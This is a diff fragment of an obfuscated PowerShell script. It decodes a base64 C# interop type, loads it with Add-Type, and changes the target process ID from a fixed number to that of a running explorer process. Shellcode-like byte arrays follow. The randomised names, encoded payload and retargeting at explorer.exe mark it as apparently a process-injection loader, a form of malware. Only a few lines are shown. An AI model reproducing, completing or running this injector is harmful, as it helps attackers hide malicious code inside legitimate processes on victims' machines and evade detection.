@@ -6,7 +6,7 @@ CnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoKCnB1Ymxp
 Add-Type -TypeDefinition $( [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($UMTHlvWH)))
 
 $hvjZWYbx = [NTALYUGO]
-$rYZCYFNm = 16001
+$rYZCYFNm = ((Get-Process -Name "*explorer*" | Select-Object -Index 1).Id)
 
 [Byte[]]$hZmLOwZM0=0x66,0x50,0x66,0x58
 [Byte[]]$hZmLOwZM1=0x48,0x31,0xd2,0x90
